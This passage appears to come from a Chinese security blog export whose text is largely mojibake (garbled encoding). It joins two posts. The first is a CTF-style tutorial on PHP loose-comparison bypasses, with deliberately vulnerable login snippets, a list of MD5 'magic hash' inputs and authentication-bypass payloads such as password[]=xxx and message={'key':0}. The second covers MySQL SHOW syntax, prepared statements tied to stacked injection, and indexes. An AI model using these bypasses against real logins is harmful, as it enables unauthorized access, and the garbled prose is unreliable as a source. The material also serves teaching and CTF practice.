?\u0026gt;è¿™æ˜¯PHP8.0.0å‰çš„ç‰¹æ€§ï¼Œå³åœ¨æ¯”è¾ƒå­—ç¬¦ä¸²å’Œæ•°å­—çš„æ—¶å€™ï¼Œstringä¼šå…ˆè¢«è½¬æ¢æˆæ•°å­—ï¼Œç„¶åå†è¿›è¡Œæ¯”è¾ƒ å› æ­¤æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼š 0 == \u0026ldquo;a\u0026rdquo;, var_dump(\u0026ldquo;admin\u0026rdquo;==0); éƒ½ä¼šå…ˆå°†å­—ç¬¦ä¸²å…ˆå¼ºåˆ¶è½¬æ¢æˆæ•°å€¼ï¼Œå˜æˆ0ï¼Œç„¶åå†è¿›è¡Œæ¯”è¾ƒï¼Œè‡ªç„¶å°±ç›¸ç­‰äº† åŒæ—¶ï¼Œå½“ä¸€ä¸ªå­—ç¬¦ä¸²è¢«å¼ºåˆ¶è½¬æ¢ç±»å‹å˜æˆIntçš„æ—¶å€™ï¼Œphpæ–‡æ¡£ç»™å‡ºçš„è§„åˆ™æ˜¯ï¼š If the string is numeric or leading numeric then it will resolve to the corresponding integer value, otherwise it is converted to zero (0). å³å¦‚æœstringèƒ½å¤Ÿè¢«è§£ææˆä¸ºintæˆ–è€…stringçš„å¼€å¤´æ˜¯æ•°å­—ï¼Œé‚£ä¹ˆå°±ä¼šè¢«è½¬æ¢æˆå¯¹åº”çš„æ•´å‹å€¼ï¼Œå¦åˆ™éƒ½è½¬æ¢æˆ0 é‚£ä¹ˆä»€ä¹ˆæƒ…å†µä¸‹stringä¼šè¢«è§£ææˆintå‘¢ å®˜ç½‘ç»™å‡ºçš„æ­£åˆ™è¡¨è¾¾https://www.php.net/manual/en/language.types.numeric-strings.phpå¼ WHITESPACES \\s* // è‹¥å¹²ç©ºæ ¼ LNUM [0-9]+ // æ™®é€šçš„æ•°å­— DNUM ([0-9]*)[\\.]{LNUM}) | ({LNUM}[\\.][0-9]*) // float EXPONENT_DNUM (({LNUM} | {DNUM}) [eE][+-]? {LNUM}) //ç§‘å­¦è®¡æ•°æ³• INT_NUM_STRING {WHITESPACES} [+-]? {LNUM} {WHITESPACES} FLOAT_NUM_STRING {WHITESPACES} [+-]? ({DNUM} | {EXPONENT_DNUM}) {WHITESPACES} NUM_STRING ({INT_NUM_STRING} | {FLOAT_NUM_STRING}) \u0026lt;?php $foo = 1 + \u0026#34;10.5\u0026#34;; // $foo is float (11.5) $foo = 1 + \u0026#34;-1.3e3\u0026#34;; // $foo is float (-1299) $foo = 1 + \u0026#34;bob-1.3e3\u0026#34;; // TypeError as of PHP 8.0.0, $foo is integer (1) previously $foo = 1 + \u0026#34;bob3\u0026#34;; // TypeError as of PHP 8.0.0, $foo is integer (1) previously $foo = 1 + \u0026#34;10 Small Pigs\u0026#34;; // $foo is integer (11) and an E_WARNING is raised in PHP 8.0.0, E_NOTICE previously $foo = 4 + \u0026#34;10.2 Little Piggies\u0026#34;; // $foo is float (14.2) and an E_WARNING is raised in PHP 8.0.0, E_NOTICE previously $foo = \u0026#34;10.0 pigs \u0026#34; + 1; // $foo is float (11) and an E_WARNING is raised in PHP 8.0.0, E_NOTICE previously $foo = \u0026#34;10.0 pigs \u0026#34; + 1.0; // $foo is float (11) and an E_WARNING is raised in PHP 8.0.0, E_NOTICE previously ?\u0026gt;é€šè¿‡ä»¥ä¸Šçš„çŸ¥è¯†æˆ‘ä»¬ä¹Ÿèƒ½æ˜ç™½ä¸ºä»€ä¹ˆ \u0026ldquo;admin1\u0026rdquo;==1 =\u0026gt;False çš„åŸå› ï¼Œå› ä¸ºå…¶ä¼šè¢«è½¬æ¢æˆ0è€Œä¸æ˜¯1ï¼Œ è€Œ\u0026quot;0e123456\u0026quot;==\u0026ldquo;0e4456789\u0026quot;åˆ™æ˜¯å› ä¸ºä¸¤è¾¹éƒ½æ˜¯ç§‘å­¦è®¡æ•°æ³•ï¼Œç»“æœéƒ½ä¸º0 å®ä¾‹ æ¥ä¸‹æ¥æˆ‘ä»¬è·Ÿç€Mrsm1thå¸ˆå‚…æ¥çœ‹çœ‹å‡ ä¸ªå®ä¾‹åŠ å¼ºä¸€ä¸‹å°è±¡   md5ç»•è¿‡(Hashæ¯”è¾ƒç¼ºé™·)\n\u0026lt;?php if (isset($_GET[\u0026#39;Username\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;password\u0026#39;])) { $logined = true; $Username = $_GET[\u0026#39;Username\u0026#39;]; $password = $_GET[\u0026#39;password\u0026#39;]; if (!ctype_alpha($Username)) {$logined = false;} // æ£€æŸ¥$Usernameä¸­çš„æ‰€æœ‰å­—ç¬¦æ˜¯å¦éƒ½æ˜¯å­—æ¯  if (!is_numeric($password) ) {$logined = false;} if (md5($Username) != md5($password)) {$logined = false;} if ($logined){ echo \u0026#34;successful\u0026#34;; }else{ echo \u0026#34;login failed!\u0026#34;; } } ?\u0026gt;è¿™é‡Œè¦æ±‚ $Username ä¸ºå­—æ¯ç»„æˆçš„å­—ç¬¦ä¸²ï¼Œè¦æ±‚ $password ä¸ºæ•°å­—ï¼ŒåŒæ—¶è¦æ±‚ä»–ä»¬çš„md5ç»“æœä¸€è‡´ é‚£ä¹ˆæˆ‘ä»¬çš„ç›®çš„ï¼Œå°±æ˜¯è®©ä¸¤ä¸ªmd5åçš„å€¼ï¼Œç”¨ != æ¯”è¾ƒï¼Œä¹Ÿå°±æ˜¯åœ¨å¼ºåˆ¶è½¬æ¢ä¸ºæ•°å­—ä¹‹åå†è¿›è¡Œæ¯”è¾ƒ è¿™é‡Œç»™å‡ºä¸€ç»„ç»“æœä¸º\u0026quot;0e\u0026quot;å¼€å¤´çš„å­—ç¬¦ä¸²ï¼Œ0eå¼€å¤´æ„å‘³ç€ä¼šè¢«å½“ä½œæ˜¯ç§‘å­¦è®¡æ•°æ³•æ¥ä½¿ç”¨ï¼Œå¹¶ä¸”ç»“æœéƒ½ä¸º0ï¼Œè‡ªç„¶ä¹Ÿå°±éƒ½ç›¸ç­‰ QNKCDZO 0e830400451993494058024219903391 240610708 0e462097431906509019562988736854 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s1885207154a 0e509367213418206700842008763514 s1502113478a 0e861580163291561247404381396064 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s155964671a 0e342768416822451524974117254469 s1184209335a 0e072485820392773389523109082030 s1665632922a 0e731198061491163073197128363787 s1502113478a 0e861580163291561247404381396064 s1836677006a 0e481036490867661113260034900752 s1091221200a 0e940624217856561557816327384675 s155964671a 0e342768416822451524974117254469 s1502113478a 0e861580163291561247404381396064 s155964671a 0e342768416822451524974117254469 s1665632922a 0e731198061491163073197128363787 s155964671a 0e342768416822451524974117254469 s1091221200a 0e940624217856561557816327384675 s1836677006a 0e481036490867661113260034900752 s1885207154a 0e509367213418206700842008763514 s532378020a 0e220463095855511507588041205815 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s214587387a 0e848240448830537924465865611904 s1502113478a 0e861580163291561247404381396064 s1091221200a 0e940624217856561557816327384675 s1665632922a 0e731198061491163073197128363787 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s1665632922a 0e731198061491163073197128363787 s878926199a 0e545993274517709034328855841020 æ¥æºï¼š https://www.jianshu.com/p/d3a9e7de0b12     jsonç»•è¿‡\n\u0026lt;?php if (isset($_POST[\u0026#39;message\u0026#39;])) { $message = json_decode($_POST[\u0026#39;message\u0026#39;]); $key =\u0026#34;*********\u0026#34;; if ($message-\u0026gt;key == $key) { echo \u0026#34;flag\u0026#34;; } else { echo \u0026#34;fail\u0026#34;; } } else{ echo \u0026#34;~~~~\u0026#34;; } ?\u0026gt;åœ¨è¿™ä¸ªæƒ…å†µä¸‹ $key çš„å€¼æˆ‘ä»¬ä¸çŸ¥é“ï¼Œæ— æ³•ç»™å‡ºå‡†ç¡®çš„è¾“å…¥ï¼Œä½†æ˜¯å´å¯ä»¥åˆ©ç”¨ 0==\u0026lsquo;admin\u0026rsquo; çš„å½¢å¼æ¥è¿›è¡Œç»•è¿‡ï¼Œå³æˆ‘ä»¬è¾“å…¥0ï¼Œä½¿ç›¸ç­‰åˆ¤æ–­æ—¶çš„keyçš„å€¼è¢«å¼ºåˆ¶è½¬æ¢ä¸º0æ¥è¿›è¡Œç»•è¿‡ payload: message={\u0026ldquo;key\u0026rdquo;:0}     array_search is_arrayç»•è¿‡\n\u0026lt;?php if(!is_array($_GET[\u0026#39;test\u0026#39;])){exit();} $test=$_GET[\u0026#39;test\u0026#39;]; for($i=0;$i\u0026lt;count($test);$i++){ if($test[$i]===\u0026#34;admin\u0026#34;){ echo \u0026#34;error\u0026#34;; exit(); } $test[$i]=intval($test[$i]); } if(array_search(\u0026#34;admin\u0026#34;,$test)===0){ echo \u0026#34;flag\u0026#34;; } else{ echo \u0026#34;false\u0026#34;; } ?\u0026gt;è„šæœ¬è¦æ±‚GETè¾“å…¥çš„å€¼ test æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå¹¶ä¸”æ•°ç»„ä¸­çš„æ¯ä¸€ä¸ªå…ƒç´ éƒ½ä¸èƒ½ç­‰äº admin ï¼Œä½†æ˜¯åˆè¦æ±‚åœ¨ array_search çš„æœç´¢ä¸­éœ€è¦æœ‰ admin array_search(mixed $needle, array $haystack, bool $strict = false): int|string|false $needleä»£è¡¨æŸ¥è¯¢çš„å­—ç¬¦ä¸²ï¼Œ$haystackæ˜¯è¢«æŸ¥è¯¢çš„æ•°ç»„ï¼Œè€Œ $strict å‚æ•°çš„è®¾ç½®ä¹Ÿå†³å®šäº†æ˜¯å¦èƒ½å¤Ÿè¿›è¡Œç»•è¿‡ï¼Œå³æ˜¯å¦è¿›è¡Œâ€œ===â€æ¯”è¾ƒï¼Œå¦‚æœæ²¡æœ‰è®¾ç½®ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬çš„å­—ç¬¦ä¸²ä¸­æœ‰0ï¼Œåœ¨è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™å°±ä¼šä½¿ $needle è¢«è½¬æ¢æˆä¸º0æ¥è¿›è¡Œæ¯”è¾ƒ payload: test[]=0 è¿›è¡Œç»•è¿‡ \u0026lt;?php $a=array(0,1); var_dump(array_search(\u0026#34;admin\u0026#34;,$a)); // int(0) =\u0026gt; è¿”å›é”®å€¼0 var_dump(array_seach(\u0026#34;1admin\u0026#34;,$a)); // int(1) ==\u0026gt;è¿”å›é”®å€¼1 ?\u0026gt;    strcmpæ¼æ´ç»•è¿‡ php -v \u0026lt;5.3\n\u0026lt;?php $password=\u0026#34;***************\u0026#34; if(isset($_POST[\u0026#39;password\u0026#39;])){ if (strcmp($_POST[\u0026#39;password\u0026#39;], $password) == 0) { echo \u0026#34;Right!!!login success\u0026#34;;n exit(); } else { echo \u0026#34;Wrong password..\u0026#34;; } ?\u0026gt;æˆ‘ä»¬åœ¨ä¸Šé¢çš„strcmpå‡½æ•°çš„ç»•è¿‡ä¸­ä¹Ÿæœ‰è¿‡è®²è§£ï¼Œstrcmpæ˜¯ç”¨æ¥æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œæ—¢ç„¶è¿™é‡Œå‡ºç°äº†\u0026rdquo;== 0\u0026quot; é‚£æˆ‘ä»¬å°±åº”è¯¥æƒ³åŠæ³•å¾€å¼±ç±»å‹æ¯”è¾ƒç»•è¿‡ä¸Šå»é ï¼Œé‚£ä¹ˆå½“strcmpæ‰€æ¥å—çš„æ˜¯æ•°ç»„çš„æ—¶å€™ï¼Œå°†å‘ç”Ÿé”™è¯¯ï¼Œå¹¶è¿”å›0 payload: password[]=xxx     switchç»•è¿‡\n\u0026lt;?php $a=\u0026#34;4admin\u0026#34;; switch ($a) { case 1: echo \u0026#34;fail1\u0026#34;; break; case 2: echo \u0026#34;fail2\u0026#34;; break; case 3: echo \u0026#34;fail3\u0026#34;; break; case 4: echo \u0026#34;sucess\u0026#34;; //ç»“æœè¾“å‡ºsuccess;  break; default: echo \u0026#34;failall\u0026#34;; break; } ?\u0026gt;switchæœ¬è´¨ä¸Šè¿˜æ˜¯è¿›è¡Œå¼±ç±»å‹æ¯”è¾ƒï¼Œæˆ‘ä»¬å¯ä»¥ç”¨åŒæ ·çš„æ–¹æ³•è¿›è¡Œç»•è¿‡   ","date":"2022-06-08T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/php_bypass_tricks/","title":"PHPç‰¹æ€§ç»•è¿‡æŠ€å·§"},{"content":"Mysqlä¸­çš„â€œå¥‡æŠ€æ·«å·§â€ MySQLä¸­showè¯­æ³•ä½¿ç”¨æ€»ç»“ https://www.cnblogs.com/saneri/p/6963583.html æˆ‘ä»¬ä¸€èˆ¬æ¥è§¦åˆ°çš„Mysqlè¯­å¥éƒ½æ˜¯å¢åˆ æ”¹æŸ¥æ•°æ®åº“ä¸­å­˜å‚¨çš„æ•°æ®ï¼Œä½†æ˜¯Mysqlè¿˜æä¾›äº†å¾ˆå¤šå¯¹äºå…¶ä»–ä¿¡æ¯çš„æŸ¥è¯¢ï¼Œè¿™æ ·çš„è¯­å¥å¯ä»¥ç”¨äºä¾‹å¦‚å †å æ³¨å…¥çš„åœ°æ–¹ã€‚ showå‘½ä»¤å°±å¯ä»¥æ˜¾ç¤ºå¾ˆå¤šçš„metadataçš„ä¿¡æ¯  Figure 1: help show: https://dev.mysql.com/doc/refman/5.7/en/show.html\n  å¸®åŠ©æŸ¥çœ‹ï¼š mysql\u0026gt; help show mysql\u0026gt; help SHOW TABLE; mysql\u0026gt; help SHOW WARNINGS 1.æ˜¾ç¤ºmysqlä¸­æ‰€æœ‰æ•°æ®åº“çš„åç§°. mysql\u0026gt;show databases; 2.æ˜¾ç¤ºå½“å‰æ•°æ®åº“ä¸­æ‰€æœ‰è¡¨çš„åç§° mysql\u0026gt;show tables; æˆ– mysql\u0026gt;show tables from database_name; 3.æ˜¾ç¤ºè¡¨ä¸­åˆ—åç§° mysql\u0026gt;show columns from database_name.table_name; 4.æŸ¥çœ‹æŸMySQLç”¨æˆ·çš„ä½¿ç”¨æƒé™ mysql\u0026gt;show grants for user_name; 5.æ˜¾ç¤ºcreate database è¯­å¥æ˜¯å¦èƒ½å¤Ÿåˆ›å»ºæŒ‡å®šçš„æ•°æ®åº“,å¹¶å¯ä»¥æŸ¥çœ‹åˆ°åˆ›å»ºåº“è¯­å¥çš„SQLä¿¡æ¯ã€‚ mysql\u0026gt;show create database database_name; 6.æ˜¾ç¤ºcreate table è¯­å¥æ˜¯å¦èƒ½å¤Ÿåˆ›å»ºæŒ‡å®šçš„æ•°æ®è¡¨,å¹¶å¯ä»¥æŸ¥çœ‹åˆ°è¡¨åˆ›å»ºè¯­å¥çš„SQLä¿¡æ¯ã€‚ mysql\u0026gt;show create table table_name; 7.æ˜¾ç¤ºå®‰è£…ä»¥åå¯ç”¨çš„å­˜å‚¨å¼•æ“å’Œé»˜è®¤å¼•æ“ã€‚ mysql\u0026gt;show engines; 8.æ˜¾ç¤ºæœ€åä¸€ä¸ªæ‰§è¡Œçš„è¯­å¥æ‰€äº§ç”Ÿçš„é”™è¯¯ã€è­¦å‘Šå’Œé€šçŸ¥ mysql\u0026gt; show warnings; 9.åªæ˜¾ç¤ºæœ€åä¸€ä¸ªæ‰§è¡Œè¯­å¥æ‰€äº§ç”Ÿçš„é”™è¯¯ mysql\u0026gt;show errors; 10.æ˜¾ç¤ºç³»ç»Ÿä¸­æ­£åœ¨è¿è¡Œçš„æ‰€æœ‰è¿›ç¨‹ï¼Œä¹Ÿå°±æ˜¯å½“å‰æ­£åœ¨æ‰§è¡Œçš„æŸ¥è¯¢. mysql\u0026gt; show processlist\\G 11.æŸ¥çœ‹æ‰€æœ‰å­˜å‚¨è¿‡ç¨‹ã€‚ mysql\u0026gt; show procedure status; 12.æŸ¥çœ‹æŸä¸ªå­˜å‚¨è¿‡ç¨‹å†…å®¹ show create procedure å­˜å‚¨è¿‡ç¨‹åç§°; 13.æŸ¥çœ‹å‡½æ•°çš„å†…å®¹. show create function func_name; é¢„ç¼–è¯‘è¯­å¥ Prepare statement Syntax: PREPARE stmt_name FROM preparable_stmt PREPARE è¯­å¥ä¼šæŠŠä¸€ä¸ªSQLè¯­å¥èµ‹å€¼ç»™ä¸€ä¸ªå˜é‡åstmt_nameç”¨äºåé¢çš„å¼•ç”¨ã€‚ é¢„ç¼–è¯‘è¯­å¥ä¼šè¢« EXECUTE æ‰§è¡Œï¼Œç„¶åè¢« DEALLOCATE PREPARE é‡Šæ”¾ ä»¥ä¸‹æ˜¯ä¸€ä¸ªä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥çš„ä¾‹å­ï¼Œä½¿ç”¨\u0026rsquo;?\u0026lsquo;æ¥å ä½ï¼Œç„¶åé€šè¿‡ SET æ¥èµ‹å€¼å†ç»“åˆåœ¨ä¸€èµ·ä½¿ç”¨ï¼Œæœ€åç”¨ DEALLOCATE PREPARE æ¥é‡Šæ”¾ mysql\u0026gt;PREPAREstmt1FROM\u0026#39;SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse\u0026#39;;mysql\u0026gt;SET@a=3;mysql\u0026gt;SET@b=4;mysql\u0026gt;EXECUTEstmt1USING@a,@b;+------------+ |hypotenuse|+------------+ |5|+------------+ mysql\u0026gt;DEALLOCATEPREPAREstmt1;Index ç´¢å¼• å‚è€ƒï¼š ä¸€æ–‡ææ‡‚MySQLç´¢å¼•ï¼ˆæ¸…æ™°æ˜äº†ï¼‰ MySQLç´¢å¼•å®ç°åŸç†åˆ†æ Basic åŸºç¡€æ¦‚å¿µ Indexï¼Œç´¢å¼•ï¼Œæ˜¯Mysqlæ•°æ®åº“ä¸­ä¸€ä¸ªç”¨æ¥æé«˜è¡¨å†…æŸ¥è¯¢é€Ÿåº¦çš„æ•°æ®ç»“æ„ã€‚ å¦‚æœæ²¡æœ‰Indexï¼Œé‚£ä¹ˆå½“æˆ‘ä»¬æƒ³è¦ä»ä¸€ä¸ªæœ‰ä¸€ä¸‡æ¡è®°å½•çš„è¡¨ä¸­æ‰¾åˆ°æˆ‘ä»¬æƒ³è¦çš„ä¸€åˆ—æ—¶ï¼Œæœ€åçš„æƒ…å†µå°±æ˜¯è¦éå†ä¸€ä¸‡æ¡æ•°æ®æ‰èƒ½å‘ç°åŒ¹é…çš„ï¼Œä½†æ˜¯å¦‚æœæ˜¯æœ‰Indexçš„è¯ï¼Œå°±å¯ä»¥åƒå­—å…¸ä¸€æ ·ï¼Œæå‰æ‰¾åˆ°å…¶ä½ç½®ï¼Œç„¶åå¿«é€Ÿå¾—åˆ°ï¼ŒIndexçš„ä½¿ç”¨æå¤§çš„æå‡äº†Mysqlçš„æŸ¥è¯¢é€Ÿåº¦å’Œæ•ˆç‡ Indexçš„ä½¿ç”¨å°†æå¤§çš„å¸®åŠ©SELECTè¯­å¥ï¼Œä½†æ˜¯ä¼šé™ä½INSERT and UPDATEçš„é€Ÿåº¦ï¼Œå› ä¸ºå¯¹äºtableçš„å˜åŠ¨è¿˜éœ€è¦æ›´æ–°indexçš„ä¿¡æ¯ æˆ‘åœ¨å­¦ä¹ çš„æ—¶å€™æœ‰Indexçš„æ¦‚å¿µçš„æ—¶å€™è¿˜æ˜¯æ²¡æœ‰è·³è„±å‡ºä¹‹å‰å¢åˆ æ”¹æŸ¥çš„è¯­æ³•çš„ä½¿ç”¨ï¼Œä¸€ç›´åœ¨æ‰¾èµ„æ–™æƒ³çœ‹çœ‹Indexå…·ä½“è¦æ€ä¹ˆå’ŒæŸ¥è¯¢ä¸€èµ·ä½¿ç”¨ï¼Œæ…¢æ…¢å¼€å§‹ç†è§£ä¹‹åæ‰çªç„¶æ„è¯†åˆ°Indexçš„åˆ›å»ºå…¶å®å°±æ˜¯ä¸€ç§å­—å…¸ç´¢å¼•çš„å»ºç«‹ï¼Œåªè¦åˆ›å»ºäº†åˆé€‚çš„ç´¢å¼•ï¼Œé‚£ä¹ˆå†ä¸‹ä¸€æ¬¡è¿›è¡Œselectè¯­å¥çš„æ—¶å€™ï¼ŒIndexå°±ä¼šè‡ªåŠ¨åŠ é€Ÿæœ¬æ¬¡æŸ¥è¯¢ï¼Œä¹Ÿå°±æ˜¯æˆ‘æƒ³æ‰¾çš„å¦‚ä½•ä½¿ç”¨Indexçš„ç­”æ¡ˆã€‚ æ¥ç€æˆ‘å°±çœ‹åˆ°äº†W3schoolsç»™çš„è§£é‡Šï¼Œå°±éå¸¸æ¸…æ™°äº†ï¼šThe users cannot see the indexes, they are just used to speed up searches/queries :) æ¥ä¸‹æ¥æˆ‘ä»¬å°±æ¥çœ‹çœ‹å…·ä½“è¦å¦‚ä½•åˆ›å»ºIndex Indexçš„è¯­æ³• åˆ›å»ºä¸€ä¸ªæœ€åŸºæœ¬çš„Indexï¼Œå…è®¸å­˜åœ¨é‡å¤çš„å€¼ CREATEINDEXindex_nameONtable_name(column1,column2,...);ä¾‹å­ CREATEINDEXidx_lastnameONPersons(LastName);CREATEINDEXidx_pnameONPersons(LastName,FirstName);åˆ›å»ºä¸€ä¸ªå”¯ä¸€çš„Indexï¼Œä¸å…è®¸é‡å¤çš„å€¼ CREATEUNIQUEINDEXindex_nameONtable_name(column1,column2,...);é€šè¿‡ä¿®æ”¹è¡¨ç»“æ„æ¥æ·»åŠ ç´¢å¼• ALTERtabletableNameADDINDEXindexName(columnName)å¦‚æœæ˜¯CHARï¼ŒVARCHARç±»å‹ï¼Œlengthå¯ä»¥å°äºå­—æ®µå®é™…é•¿åº¦ï¼›å¦‚æœæ˜¯BLOBå’ŒTEXTç±»å‹ï¼Œå¿…é¡»æŒ‡å®šlengthã€‚ åˆ›å»ºè¡¨çš„æ—¶å€™ç›´æ¥æŒ‡å®šINDEX CREATETABLEmytable(IDINTNOTNULL,usernameVARCHAR(16)NOTNULL,INDEX[indexName](username(length)));åˆ é™¤ç´¢å¼• DROPINDEX[indexName]ONmytable;Indexä½¿ç”¨çš„å‡†åˆ™ä¸åœºæ™¯ ä¹‹å‰æˆ‘ä»¬æåˆ°äº†Indexæœ¬è´¨æ˜¯ä¸€ä¸ªæ•°æ®ç»“æ„ï¼Œé‚£ä¹ˆä½œä¸ºä¸€ä¸ªæ•°æ®ç»“æ„æ¥å­˜å‚¨å¤§é‡çš„æ•°æ®ï¼ŒåŠ¿å¿…ä¹Ÿéœ€è¦å ç”¨ç‰©ç†ç£ç›˜ï¼Œé‚£ä¹ˆå¦‚ä½•åˆç†çš„åˆ©ç”¨ç´¢å¼•æ¥åŠ é€ŸæŸ¥è¯¢çš„åŒæ—¶åˆå‡å°‘å¼€é”€å‘¢ï¼Ÿ   åº”å½“åˆ›å»ºç´¢å¼•çš„åˆ—\n åœ¨ ç»å¸¸éœ€è¦æœç´¢çš„åˆ— ä¸Šï¼Œå¯ä»¥åŠ å¿«æœç´¢çš„é€Ÿåº¦  åœ¨ä½œä¸º ä¸»é”®çš„åˆ— ä¸Šï¼Œå¼ºåˆ¶è¯¥åˆ—çš„å”¯ä¸€æ€§å’Œç»„ç»‡è¡¨ä¸­æ•°æ®çš„æ’åˆ—ç»“æ„  åœ¨ç»å¸¸ç”¨åœ¨ è¿æ¥ï¼ˆJOINï¼‰çš„åˆ— ä¸Šï¼Œè¿™äº›åˆ—ä¸»è¦æ˜¯ å¤–é”® ï¼Œå¯ä»¥åŠ å¿«è¿æ¥çš„é€Ÿåº¦  åœ¨ç»å¸¸éœ€è¦ æ ¹æ®èŒƒå›´ ï¼ˆ\u0026lt;ï¼Œ\u0026lt;=ï¼Œ=ï¼Œ\u0026gt;ï¼Œ\u0026gt;=ï¼ŒBETWEENï¼ŒINï¼‰è¿›è¡Œæœç´¢çš„åˆ—ä¸Šåˆ›å»ºç´¢å¼•ï¼Œå› ä¸º ç´¢å¼•å·²ç»æ’åº ï¼Œå…¶æŒ‡å®šçš„èŒƒå›´æ˜¯è¿ç»­çš„  åœ¨ç»å¸¸éœ€è¦ æ’åº ï¼ˆorder byï¼‰çš„åˆ—ä¸Šåˆ›å»ºç´¢å¼•ï¼Œå› ä¸ºç´¢å¼•å·²ç»æ’åºï¼Œè¿™æ ·æŸ¥è¯¢å¯ä»¥åˆ©ç”¨ç´¢å¼•çš„æ’åºï¼ŒåŠ å¿«æ’åºæŸ¥è¯¢æ—¶é—´ï¼›  åœ¨ç»å¸¸ä½¿ç”¨åœ¨ WHEREå­å¥ä¸­çš„åˆ— ä¸Šé¢åˆ›å»ºç´¢å¼•ï¼ŒåŠ å¿«æ¡ä»¶çš„åˆ¤æ–­é€Ÿåº¦ã€‚       ä¸è¯¥åˆ›å»ºç´¢å¼•çš„åˆ—\n å¯¹äºé‚£äº›åœ¨æŸ¥è¯¢ä¸­ å¾ˆå°‘ä½¿ç”¨æˆ–è€…å‚è€ƒreferenceçš„åˆ— ä¸åº”è¯¥åˆ›å»ºç´¢å¼•ã€‚  è‹¥åˆ—å¾ˆå°‘ä½¿ç”¨åˆ°ï¼Œå› æ­¤æœ‰ç´¢å¼•æˆ–è€…æ— ç´¢å¼•ï¼Œå¹¶ä¸èƒ½æé«˜æŸ¥è¯¢é€Ÿåº¦ã€‚ç›¸åï¼Œç”±äºå¢åŠ äº†ç´¢å¼•ï¼Œåè€Œé™ä½äº†ç³»ç»Ÿçš„ç»´æŠ¤é€Ÿåº¦å’Œå¢å¤§äº†ç©ºé—´éœ€æ±‚ã€‚    å¯¹äºé‚£äº›åªæœ‰ å¾ˆå°‘æ•°æ®å€¼ æˆ–è€… é‡å¤å€¼å¤šçš„åˆ— ä¹Ÿä¸åº”è¯¥å¢åŠ ç´¢å¼•ã€‚  è¿™äº›åˆ—çš„å–å€¼å¾ˆå°‘ï¼Œä¾‹å¦‚äººäº‹è¡¨çš„æ€§åˆ«åˆ—ï¼Œåœ¨æŸ¥è¯¢çš„ç»“æœä¸­ï¼Œç»“æœé›†çš„æ•°æ®è¡Œå äº†è¡¨ä¸­æ•°æ®è¡Œçš„å¾ˆå¤§æ¯”ä¾‹ï¼Œå³éœ€è¦åœ¨è¡¨ä¸­æœç´¢çš„æ•°æ®è¡Œçš„æ¯”ä¾‹å¾ˆå¤§ã€‚å¢åŠ ç´¢å¼•ï¼Œå¹¶ä¸èƒ½æ˜æ˜¾åŠ å¿«æ£€ç´¢é€Ÿåº¦ã€‚    å¯¹äºé‚£äº›å®šä¹‰ä¸º text, imageå’Œbit æ•°æ®ç±»å‹çš„åˆ—ä¸åº”è¯¥å¢åŠ ç´¢å¼•ã€‚  è¿™äº›åˆ—çš„æ•°æ®é‡è¦ä¹ˆç›¸å½“å¤§ï¼Œè¦ä¹ˆå–å€¼å¾ˆå°‘ã€‚    å½“è¯¥åˆ— ä¿®æ”¹(Insert, Update)æ€§èƒ½è¦æ±‚è¿œè¿œé«˜äºæ£€ç´¢(Select)æ€§èƒ½ æ—¶ï¼Œä¸åº”è¯¥åˆ›å»ºç´¢å¼•ã€‚ï¼ˆä¿®æ”¹æ€§èƒ½å’Œæ£€ç´¢æ€§èƒ½æ˜¯äº’ç›¸çŸ›ç›¾çš„ï¼‰     Indexçš„å®ç°åŸç† é‚£ä¹ˆIndexç©¶ç«Ÿä½¿ç”¨äº†ä»€ä¹ˆæ•°æ®ç»“æ„æ¥è¿›è¡Œå­˜å‚¨è¿›è€ŒåŠ å¿«äº†æ£€ç´¢é€Ÿåº¦å‘¢ï¼Ÿ æˆ‘ä»¬ä»¥å¸¸è§çš„InnoDBæ¥ä¸¾ä¾‹ï¼Œå…¶ä½¿ç”¨çš„æ˜¯B+Treeæ¥è¿›è¡Œç´¢å¼•ç»“æ„ï¼Œå°†åŸæœ¬éœ€è¦å¯¹æ‰€æœ‰çš„è®°å½•ä¾æ¬¡åŒ¹é…è®°å½•çš„æ–¹å¼å˜ä¸ºäº†é€šè¿‡æ ‘æ¥è¿›è¡ŒäºŒå…ƒåˆ¤æ–­é€æ¸ç¼©å°èŒƒå›´ B+Treeçš„ç‰¹ç‚¹æ˜¯å…¶æœ¬èº«åœ¨å¶èŠ‚ç‚¹å°±ä¼šå­˜å‚¨å®Œæ•´çš„æ•°æ®è®°å½•ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è¯´ï¼Œç´¢å¼•æ‰€å­˜å‚¨çš„æ–‡ä»¶ï¼Œå°±æ˜¯æ•°æ®è¡¨å…¶æœ¬èº«ï¼Œä»¥åŠï¼š  æ‰€æœ‰å…³é”®å­—éƒ½å‡ºç°åœ¨å¶å­ç»“ç‚¹çš„é“¾è¡¨ä¸­ï¼Œä¸”é“¾è¡¨ä¸­çš„å…³é”®å­—æ°å¥½æ˜¯æœ‰åºçš„ï¼›  ä¸å¯èƒ½åœ¨éå¶å­ç»“ç‚¹å‘½ä¸­ï¼›  éå¶å­ç»“ç‚¹ç›¸å½“äºæ˜¯å¶å­ç»“ç‚¹çš„ç´¢å¼•ï¼Œå¶å­ç»“ç‚¹ç›¸å½“äºæ˜¯å­˜å‚¨ï¼ˆå…³é”®å­—ï¼‰æ•°æ®çš„æ•°æ®å±‚ï¼›  æ¯ä¸€ä¸ªå¶å­èŠ‚ç‚¹éƒ½åŒ…å«æŒ‡å‘ä¸‹ä¸€ä¸ªå¶å­èŠ‚ç‚¹çš„æŒ‡é’ˆï¼Œä»è€Œæ–¹ä¾¿å¶å­èŠ‚ç‚¹çš„èŒƒå›´éå†ã€‚  